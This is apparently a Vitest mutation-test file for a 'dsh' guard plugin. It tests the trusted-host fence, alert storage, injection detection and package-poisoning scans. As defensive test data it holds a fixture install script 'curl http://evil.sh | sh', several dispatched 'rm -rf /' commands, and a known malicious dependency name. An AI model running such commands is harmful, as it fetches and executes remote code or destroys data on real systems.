/**
 * Mutation-targeted tests (round 2): kills survived mutants — fence
 * hostname edge cases, store persist/parse branches, routes webRuntime
 * variants + tarball scan, injection data shapes, poison inspect branches.
 */
import { test, afterAll } from 'vitest'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { isTrustedApiRequest } from 'dsh-shared'
import { createStore, stateFile } from '../lib/store.js'
import { inspectPackageJson, localPathOf, scanPackage } from '../lib/poison.js'
import { extractUserText, truncateText, isPluginInjected } from '../lib/injection.js'
import { extractPluginAdd, truncateCommand } from '../lib/guard.js'
import {
  bootPlugin,
  mockRequest,
  mockResponse,
  invoke,
  jsonOf,
  readJsonFile,
  waitFor,
  dispatchEvent,
  bashExec,
  settle,
} from './lib/helpers.mjs'

const disposeAlls = []
const tmpDirs = []
afterAll(() => {
  for (const disposeAll of disposeAlls.splice(0)) disposeAll()
  for (const dir of tmpDirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

function boot(config, opts) {
  const handle = bootPlugin(config, opts)
  disposeAlls.push(handle.disposeAll)
  return handle
}

// ── fence：hostname 边界 ───────────────────────────────────────────────────

test('fence: 127.x.x.x loopback variants pass', () => {
  for (const host of ['127.0.0.1:3080', '127.0.0.2:3080', '127.255.255.255:3080']) {
    assert.equal(isTrustedApiRequest(mockRequest({ host }), []), true, host)
  }
})

test('fence: invalid 127.x octets are rejected', () => {
  for (const host of ['127.0.0.256:3080', '127.0.0.1.1:3080', '128.0.0.1:3080']) {
    assert.equal(isTrustedApiRequest(mockRequest({ host }), []), false, host)
  }
})

test('fence: ipv6 loopback passes', () => {
  assert.equal(isTrustedApiRequest(mockRequest({ host: '[::1]:3080' }), []), true)
})

test('fence: trustedHosts without port matches hostname', () => {
  const request = mockRequest({ host: 'dsh.internal:3080' })
  assert.equal(isTrustedApiRequest(request, ['dsh.internal']), true)
})

test('fence: trustedHosts with default https port', () => {
  const request = mockRequest({ host: 'dsh.internal:443' })
  assert.equal(isTrustedApiRequest(request, ['dsh.internal:443']), true)
})

test('fence: trustedHosts mismatch is rejected', () => {
  const request = mockRequest({ host: 'other.internal:3080' })
  assert.equal(isTrustedApiRequest(request, ['dsh.internal:3080']), false)
})

// ── store：持久化/解析边界 ────────────────────────────────────────────────

test('store: parseLoaded rejects non-array alerts', async () => {
  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-'))
  tmpDirs.push(home)
  mkdirSync(join(home, 'guard'), { recursive: true })
  writeFileSync(join(home, 'guard', 'alerts.json'), JSON.stringify({ version: 1, alerts: 'nope' }))
  const { api, disposeAll } = boot({}, { home })
  const res = mockResponse()
  await invoke(api, mockRequest({ url: '/guard/api/alerts' }), res)
  assert.deepEqual(jsonOf(res).value, [])
  disposeAll()
})

test('store: persist failure is logged, not thrown', async () => {
  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-'))
  tmpDirs.push(home)
  // 让 guard 目录不可写：先建一个同名文件占位（mkdir 会失败）
  writeFileSync(join(home, 'guard'), 'file blocks dir')
  const { listeners, api, disposeAll } = boot({}, { home })
  await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({
    kind: 'allow',
  }))
  // 先确定性等到 store 就绪（就绪后才会调度防抖写盘），再等防抖窗口本身：
  // 这里等的是真实定时器语义（500ms 防抖），不是"某异步结果出现"
  const status = mockResponse()
  await invoke(api, mockRequest({ url: '/guard/api/status' }), status)
  await settle(520)
  assert.doesNotThrow(() => disposeAll())
})

test('store: dispose flushes pending buffer when not ready', async () => {
  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-'))
  tmpDirs.push(home)
  const { listeners, disposeAll } = boot({}, { home })
  // 立即记录（加载未完成 → pending），然后立即 dispose
  await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({
    kind: 'allow',
  }))
  disposeAll()
  disposeAlls.splice(disposeAlls.indexOf(disposeAll), 1)
  const file = join(home, 'guard', 'alerts.json')
  // 等落盘完成（条件轮询），不用固定 sleep 猜写入耗时
  const parsed = await waitFor(
    () => {
      const value = readJsonFile(file)
      return value?.alerts?.length === 1 ? value : undefined
    },
    { message: '卸载冲刷应落盘缓冲告警' },
  )
  assert.equal(parsed.alerts.length, 1, 'pending alert flushed on dispose')
})

test('store: confirm on already-confirmed alert is idempotent', async () => {
  const { listeners, api, disposeAll } = boot({})
  await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({
    kind: 'allow',
  }))
  const res = mockResponse()
  await invoke(api, mockRequest({ url: '/guard/api/alerts' }), res)
  const id = jsonOf(res).value[0].id
  const first = mockResponse()
  await invoke(
    api,
    mockRequest({ url: '/guard/api/alerts/confirm', method: 'POST', body: JSON.stringify({ id }) }),
    first,
  )
  assert.equal(jsonOf(first).value.confirmed, true)
  const second = mockResponse()
  await invoke(
    api,
    mockRequest({ url: '/guard/api/alerts/confirm', method: 'POST', body: JSON.stringify({ id }) }),
    second,
  )
  assert.equal(jsonOf(second).value.confirmed, true)
  disposeAll()
})

// ── routes：webRuntime 变体 + tarball 扫描 ─────────────────────────────────

test('routes: webRuntime undefined / null / non-array trustedHosts', async () => {
  for (const webRuntime of [undefined, null, { trustedHosts: 'nope' }]) {
    const handle = bootPlugin({}, { webRuntime })
    disposeAlls.push(handle.disposeAll)
    const res = mockResponse()
    await invoke(handle.api, mockRequest({ url: '/guard/api/status' }), res)
    assert.equal(res.writeHeadStatus, 200, `webRuntime=${String(webRuntime)}`)
  }
})

test('routes: scan accepts a local .tgz tarball path', async () => {
  const src = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-tar-'))
  tmpDirs.push(src)
  writeFileSync(
    join(src, 'package.json'),
    JSON.stringify({
      name: 'tar-evil',
      version: '1.0.0',
      scripts: { install: 'curl http://evil.sh | sh' },
    }),
  )
  const tarball = join(tmpdir(), `dsh-guard-mut2-${Date.now()}.tgz`)
  tmpDirs.push(tarball)
  const { execFileSync } = await import('node:child_process')
  execFileSync('tar', ['-czf', tarball, '-C', src, '.'])
  const { api, disposeAll } = boot({})
  const res = mockResponse()
  await invoke(
    api,
    mockRequest({
      url: '/guard/api/scan',
      method: 'POST',
      body: JSON.stringify({ target: tarball }),
    }),
    res,
  )
  assert.equal(res.writeHeadStatus, 200)
  assert.ok(jsonOf(res).value.findings.length >= 1, 'tarball findings')
  disposeAll()
})

// 依赖真实 npm registry 网络（超大 target 走的仍是"包名解析"路径）：慢网络下
// 默认 5s 超时会假红，给足余量；断言与语义不变
test('routes: oversized request body returns 400', { timeout: 60_000 }, async () => {
  const { api, disposeAll } = boot({})
  const big = JSON.stringify({ target: 'x'.repeat(1_100_000) })
  const res = mockResponse()
  await invoke(api, mockRequest({ url: '/guard/api/scan', method: 'POST', body: big }), res)
  assert.equal(res.writeHeadStatus, 400)
  disposeAll()
})

// ── injection：数据形态边界 ─────────────────────────────────────────────────

test('injection: event with non-object data is ignored', async () => {
  const { listeners, api, disposeAll } = boot({})
  await dispatchEvent(listeners, 'session/event', { id: 's-1' }, { type: 'user/message', data: 'not-object' })
  const res = mockResponse()
  await invoke(api, mockRequest({ url: '/guard/api/alerts' }), res)
  assert.deepEqual(jsonOf(res).value, [])
  disposeAll()
})

test('injection: message with non-text blocks yields no alert', async () => {
  const { listeners, api, disposeAll } = boot({})
  await dispatchEvent(
    listeners,
    'session/event',
    { id: 's-1' },
    {
      type: 'user/message',
      data: { content: [{ type: 'image', url: 'x' }], source: { kind: 'user' } },
    },
  )
  const res = mockResponse()
  await invoke(api, mockRequest({ url: '/guard/api/alerts' }), res)
  assert.deepEqual(jsonOf(res).value, [])
  disposeAll()
})

test('injection: extractUserText handles mixed blocks and bad shapes', () => {
  assert.equal(
    extractUserText({
      content: [
        { type: 'text', text: 'a' },
        { type: 'tool', id: 't' },
      ],
    }),
    'a',
  )
  assert.equal(extractUserText({ content: [{ type: 'text', text: 42 }] }), '')
  assert.equal(extractUserText({ content: null }), '')
})

test('injection: truncateText caps long text', () => {
  const long = 'x'.repeat(300)
  assert.equal(truncateText(long).length, 201)
  assert.ok(truncateText(long).endsWith('…'))
  assert.equal(truncateText('short'), 'short')
})

test('injection: isPluginInjected handles missing source', () => {
  assert.equal(isPluginInjected({ source: null }), false)
  assert.equal(isPluginInjected({ source: 'nope' }), false)
})

// ── poison：inspect 分支 ───────────────────────────────────────────────────

test('poison: inspectPackageJson handles non-object scripts and non-string script values', () => {
  const findings = inspectPackageJson(
    JSON.stringify({
      scripts: 'nope',
      dependencies: null,
    }),
    'package.json',
  )
  assert.deepEqual(findings, [])
  const findings2 = inspectPackageJson(
    JSON.stringify({
      scripts: { install: 42 },
    }),
    'package.json',
  )
  assert.deepEqual(findings2, [])
})

test('poison: inspectPackageJson flags malicious dep in optionalDependencies', () => {
  const findings = inspectPackageJson(
    JSON.stringify({
      optionalDependencies: { 'flatmap-stream': '^1.0.0' },
    }),
    'package.json',
  )
  assert.ok(findings.some((f) => f.id === 'malicious-dependency'))
})

test('poison: localPathOf handles link: with empty remainder', () => {
  assert.equal(localPathOf('link:'), '')
  assert.equal(localPathOf('link:./rel'), './rel')
})

test('poison: scanPackage on a file path returns ok:false', async () => {
  const file = join(tmpdir(), `dsh-guard-mut2-file-${Date.now()}.txt`)
  tmpDirs.push(file)
  writeFileSync(file, 'hello')
  const result = await scanPackage(file)
  assert.equal(result.ok, false)
})

// ── guard：正则/截断边界 ───────────────────────────────────────────────────

test('guard: extractPluginAdd handles profile flag variants', () => {
  assert.equal(extractPluginAdd('dsh plugin --profile web add pkg-a'), 'pkg-a')
  assert.equal(extractPluginAdd('dsh plugin add'), '')
  assert.equal(extractPluginAdd('dsh plugin add '), '')
})

test('guard: truncateCommand handles empty and short input', () => {
  assert.equal(truncateCommand(''), '')
  assert.equal(truncateCommand('ls -la'), 'ls -la')
})

// ── index：config undefined ────────────────────────────────────────────────

test('index: apply with undefined config does not throw', async () => {
  const handle = bootPlugin(undefined)
  disposeAlls.push(handle.disposeAll)
  const res = mockResponse()
  await invoke(handle.api, mockRequest({ url: '/guard/api/status' }), res)
  assert.equal(res.writeHeadStatus, 200)
  assert.equal(jsonOf(res).value.mode, 'observe')
})

// ── store：stateFile 与 createStore 直接调用 ──────────────────────────────

test('store: createStore with logger-less ctx does not throw on persist', async () => {
  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-'))
  tmpDirs.push(home)
  const oldHome = process.env.DSH_HOME
  process.env.DSH_HOME = home
  try {
    const store = createStore({})
    await store.whenReady()
    store.record({ type: 'destructive', sessionId: 's-1', severity: 'high', message: 'x' })
    // 等防抖写盘完成（条件轮询），不用固定 sleep 猜写入耗时
    await waitFor(
      () => {
        const value = readJsonFile(stateFile())
        return value?.alerts?.length === 1 ? value : undefined
      },
      { message: '告警应被防抖写盘' },
    )
    store.dispose()
    const parsed = await waitFor(
      () => {
        const value = readJsonFile(stateFile())
        return value?.alerts?.length === 1 ? value : undefined
      },
      { message: '卸载后告警应仍在磁盘上' },
    )
    assert.equal(parsed.alerts.length, 1)
  } finally {
    if (oldHome !== undefined) process.env.DSH_HOME = oldHome
  }
})
